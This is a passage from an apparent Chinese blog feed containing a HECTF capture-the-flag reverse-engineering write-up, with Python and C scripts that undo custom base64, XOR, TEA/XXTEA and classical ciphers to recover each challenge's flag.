class="number">1</span>;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,map6[i][j]);</span><br><span class="line">  </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>走的时候注意是右下角对齐。1 0 0 0 0 01 1 1 1 1 00 0 0 0 0 00 0 1 1 0 00 0 1 0 0 00 0 0 0 0 00 0 0 1 00 0 0 1 00 0 1 1 00 1 0 0 00 0 0 0 00 0 0 00 0 0 01 0 0 01 1 0 00 0 00 1 01 1 00 0 01 10 10 00 0200</code></pre><p>flag</p><pre><code>HECTF&#123;o....^oo0~0o^^o.^.O^.o^&#125;</code></pre><h2 id="Baby-anti"><a href="#Baby-anti" class="headerlink" title="Baby_anti"></a>Baby_anti</h2><p>去掉花指令，发现限定了输入范围，并根据输入不同然后，进行了不同的数据的处理，最后合并为16进制，然后和密文比较。</p><p>爆破就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># enc=&#x27;48656c31305f614e37695f5265&#x27;</span></span><br><span class="line"><span class="comment"># for i in enc:</span></span><br><span class="line"><span class="comment">#     print(int(i,16),end=&#x27;,&#x27;)</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;Hel10_aN7i_Re&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">enc=[<span class="number">4</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">5</span>]</span><br><span class="line">table=<span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">ord</span>(k)-<span class="number">48</span>)&gt;<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span>((<span class="built_in">ord</span>(k)-<span class="number">97</span>)&lt;=<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span>(enc[j]==(<span class="built_in">ord</span>(k)-j-<span class="number">37</span>)%<span class="number">6</span>+<span class="number">10</span>):</span><br><span class="line">                    print(k,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(enc[j]==(j+<span class="built_in">ord</span>(k)+<span class="number">52</span>)%<span class="number">10</span>):</span><br><span class="line">                print(k,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#HECTF&#123;47422b74515e480b70805c3920&#125;</span></span><br></pre></td></tr></table></figure><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><p>赛后才发现，tea加密后，还对全局变量进行了处理。。。伪代码看不到，还是通过自己写数据发现的。</p><p>动调发现tea加密后，还进行了下面的操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__int64 sub_400807()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax</span><br><span class="line"></span><br><span class="line">  srand(0x2710u);</span><br><span class="line">  dword_602108 ^&#x3D; rand() % 1000;</span><br><span class="line">  result &#x3D; dword_60210C ^ (unsigned int)(rand() % 1000);</span><br><span class="line">  dword_60210C &#x3D; result;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现就是异或伪随机数。</p><p>之后就是变表base64加密了。</p><p>所以解法就是，先进行base64解密，转换为DWORD，然后和伪随机数进行异或，然后tea解密。</p><p>变表base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str1 =<span class="string">&#x27;7id81DpecpDeES8frwU4Qa==&#x27;</span></span><br><span class="line">string1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">s=base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1, string2)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">hex</span>(i),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="comment">#0x84,0x80,0xe2,0x6e,0x73,0xc4,0x8,0xf9,0xc4,0xa3,0x68,0x85,0x45,0x6e,0x1e,0xd0,</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>异或+tea</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="comment">//HECTF&#123;aaaa-bbbb-cccc-dddd&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *flag ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,sum=<span class="number">0</span>,i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x779EFF7A</span>;</span><br><span class="line">    v0=flag[<span class="number">0</span>];</span><br><span class="line">    v1=flag[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++) </span><br><span class="line">    &#123;</span><br><span class="line">        v0+=( ((v1&lt;&lt;<span class="number">4</span>) ^ (v1&gt;&gt;<span class="number">5</span>)) +v1 ) ^ ( sum + key[sum&amp;<span class="number">3</span>] );</span><br><span class="line">        sum-=delta;</span><br><span class="line">        v1+=( ((v0&lt;&lt;<span class="number">4</span>) ^(v0&gt;&gt;<span class="number">5</span>)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;<span class="number">11</span>)&amp;<span class="number">3</span> ]);</span><br><span class="line">    &#125;</span><br><span class="line">    flag[<span class="number">0</span>]=v0;</span><br><span class="line">    flag[<span class="number">1</span>]=v1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *code ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,i,delta=<span class="number">0x779EFF7A</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sum=<span class="number">0</span>-delta*<span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    v0=code[<span class="number">0</span>];</span><br><span class="line">    v1=code[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1-=( ((v0&lt;&lt;<span class="number">4</span>) ^(v0&gt;&gt;<span class="number">5</span>)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;<span class="number">11</span>)&amp;<span class="number">3</span> ]);</span><br><span class="line">        sum+=delta;</span><br><span class="line">        v0-=( ((v1&lt;&lt;<span class="number">4</span>) ^ (v1&gt;&gt;<span class="number">5</span>)) +v1 ) ^ ( sum + key[sum&amp;<span class="number">3</span>] );</span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=v0;</span><br><span class="line">    code[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 0x84,0x80,0xe2,0x6e,0x73,0xc4,0x8,0xf9, 0xc4,0xa3,0x68,0x85, 0x45,0x6e,0x1e,0xd0,</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>]=&#123; <span class="number">0x64636261</span>, <span class="number">0x68676665</span>, <span class="number">0x6C6B6A69</span>, <span class="number">0x706F6E6D</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r=<span class="number">32</span>,i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">4</span>]=&#123;<span class="number">0x6ee28084</span>,<span class="number">0xf908c473</span>,<span class="number">0x8568a3c4</span>,<span class="number">0xd01e6e45</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flag[<span class="number">2</span>]=&#123;<span class="number">0x61616161</span>,<span class="number">0x62626262</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> Xor[<span class="number">4</span>]=&#123;<span class="number">0x0237D6C33</span>,<span class="number">0x1E3156EE</span>,<span class="number">0x0237D6C33</span>,<span class="number">0x01E3156EE</span>&#125;; </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    code[i]^=Xor[i]%<span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//encrypt(r,flag,key);</span></span><br><span class="line"><span class="comment">//printf(&quot;%08x %08x\n&quot;,flag[0],flag[1]);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">decrypt(r,&amp;code[i*<span class="number">2</span>],key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x %08x\n&quot;</span>,code[<span class="number">0</span>],code[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c &quot;</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">0</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">1</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">2</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//HECTF&#123;1024-2048-abcd-hhhh&#125; </span></span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>go语言，一个魔改tea加密，有结合了点xxtea的特征，照着写个加密，然后反解就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//HECTF&#123;abcdefghabcdefghabcdefg&#125; </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *flag )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> index,i,j;</span><br><span class="line">    <span class="keyword">int</span> dealt=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">30</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line">index=(j + <span class="number">1</span>)%<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">flag[j]+=((dealt+flag[index]+<span class="number">0xEAE5AD5</span>) ^ ( <span class="number">16</span> *flag[index] +<span class="number">0x64B71598</span>) ^ ((flag[index] &gt;&gt; <span class="number">5</span>) - <span class="number">0x2A04C413</span>));</span><br><span class="line"></span><br><span class="line">flag[index]+= (dealt + flag[j] + <span class="number">0xEAE5AD5</span>) ^ (<span class="number">16</span> * flag[j] + <span class="number">0x1185971C</span>) ^ ((flag[j] &gt;&gt; <span class="number">5</span>) + <span class="number">0x6F61074</span>);</span><br><span class="line">&#125;</span><br><span class="line">dealt+=<span class="number">0xEAE5AD5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *flag )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i,index;</span><br><span class="line">    <span class="keyword">int</span> dealt=<span class="number">0xEAE5AD5</span>*<span class="number">32</span>;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">dealt-=<span class="number">0xEAE5AD5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">29</span>;j&gt;=<span class="number">0</span>;j--)</span><br><span class="line">&#123;</span><br><span class="line">index=(j+<span class="number">1</span>)%<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">flag[index]-= (dealt + flag[j] + <span class="number">0xEAE5AD5</span>) ^ (<span class="number">16</span> * flag[j] + <span class="number">0x1185971C</span>) ^ ((flag[j] &gt;&gt; <span class="number">5</span>) + <span class="number">0x6F61074</span>);</span><br><span class="line"></span><br><span class="line">flag[j]-=((dealt+flag[index]+<span class="number">0xEAE5AD5</span>) ^ ( <span class="number">16</span> *flag[index] +<span class="number">0x64B71598</span>) ^ ((flag[index] &gt;&gt; <span class="number">5</span>) - <span class="number">0x2A04C413</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">30</span>]=&#123;<span class="number">0x48</span>,<span class="number">0x45</span>,<span class="number">0x43</span>,<span class="number">0x54</span>,<span class="number">0x46</span>,<span class="number">0x7b</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x7d</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flag[<span class="number">30</span>]=&#123;<span class="number">0x67185a11</span>,<span class="number">0xe98651dc</span>,<span class="number">0x354a7497</span>,<span class="number">0x104a33b2</span>,<span class="number">0x4b0d80a6</span>,<span class="number">0x7b7dad7a</span>,<span class="number">0xeeab3824</span>,<span class="number">0xfc48315e</span>,<span class="number">0x31aaf1c5</span>,<span class="number">0x577ee036</span>,<span class="number">0x65938f6c</span>,<span class="number">0xdb52c493</span>,<span class="number">0xa20eace0</span>,<span class="number">0xcc54c27d</span>,<span class="number">0x54ecc3c1</span>,<span class="number">0xf7f51fa6</span>,<span class="number">0xbf187da8</span>,<span class="number">0x4f723fb1</span>,<span class="number">0x0f936a37</span>,<span class="number">0x466e0d5d</span>,<span class="number">0x42bba543</span>,<span class="number">0x707d816c</span>,<span class="number">0xea694ed4</span>,<span class="number">0xa4c6d06f</span>,<span class="number">0x266e4f35</span>,<span class="number">0x3246607f</span>,<span class="number">0xd91b6bfd</span>,<span class="number">0x7933b9a4</span>,<span class="number">0x1185eed8</span>,<span class="number">0xe2e4347d</span>&#125;;</span><br><span class="line">    </span><br><span class="line">encrypt(code);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">30</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x &quot;</span>,code[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypt(flag);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">30</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//HECTF&#123;Lets_g0_t0_dr1nk_tea!!!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Baby-pp"><a href="#Baby-pp" class="headerlink" title="Baby_pp"></a>Baby_pp</h2><p>开始看到易语言图标，以为易语言写的，然后调试了一波，看到利用了CreateProcess创建子进程反调试，以为多难呢，后来发现就是个python打包的exe，直接常规操作得到py文件。</p><p>然后开逆，发现就是伪随机数异或+栅栏+云隐密码(hint有)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># def encode(s, nuum):</span></span><br><span class="line"><span class="comment">#     step = len(s) // nuum</span></span><br><span class="line"><span class="comment">#     ens = &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     for i in range(step):</span></span><br><span class="line"><span class="comment">#         ens += s[i::step]</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         return ens</span></span><br><span class="line"><span class="comment"># print(encode(&#x27;abcdefghijklmnopqr&#x27;,6))</span></span><br><span class="line"><span class="comment">#adgjmpbehknqcfilor</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;742641edefb6770733ab5932325106b3a5fa75222791d09e451161c46f15504402b32737362443d4df7d136145cd970b54116669c230&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        s+=enc[i * <span class="number">6</span> + j]</span><br><span class="line">flag=<span class="built_in">bytearray</span>.fromhex(s)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">10085</span>)</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = flag[i] ^ random.randint(<span class="number">0</span>, <span class="number">127</span>)</span><br><span class="line">    print(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#HECTF&#123;decrypt(80410840840842108808881088408084210842)&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de_code</span>(<span class="params">c</span>):</span></span><br><span class="line">    dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) + <span class="number">1</span>)]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    c2 = [i <span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&quot;0&quot;</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">        c3 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            c3 += <span class="built_in">int</span>(j)</span><br><span class="line">        flag+=(dic[c3 - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">print(de_code(<span class="string">&#x27;80410840840842108808881088408084210842&#x27;</span>))</span><br><span class="line"><span class="comment">#HELLOPYTHON</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Baby-and"><a href="#Baby-and" class="headerlink" title="Baby_and"></a>Baby_and</h2><p>安卓题，感觉就是用key异或一个jpg图片，看了下当时的脚本，发现是key没弄对，key的最后一个字符错了，原因是因为用的jpg的标准头文件不止一种，实际上也可以猜的，可以看到jpg里面有很多，q7Z2，和0异或就是本身，所以可以猜测key=’q7Z2’。</p><p>对安卓的了解还是太少了，安卓题是硬伤呀。。。只能通过jeb里面的代码来猜测。对整体的流程还是不清楚。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;JFIF.jpg&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data=f.read()[:-<span class="number">1</span>]</span><br><span class="line">array=<span class="built_in">list</span>(data)</span><br><span class="line">key=<span class="string">&#x27;q7Z2&#x27;</span></span><br><span class="line">flag=[]</span><br><span class="line"></span><br><span class="line">flag_file=<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">    flag.append(array[i]^<span class="built_in">ord</span>(key[i%<span class="number">4</span>]))</span><br><span class="line">flag_file.write(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="comment">#HECTF&#123;He1l0_Android^_^&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python spider learning</title>
      <link href="2021/11/10/python%20spider%20learning/"/>
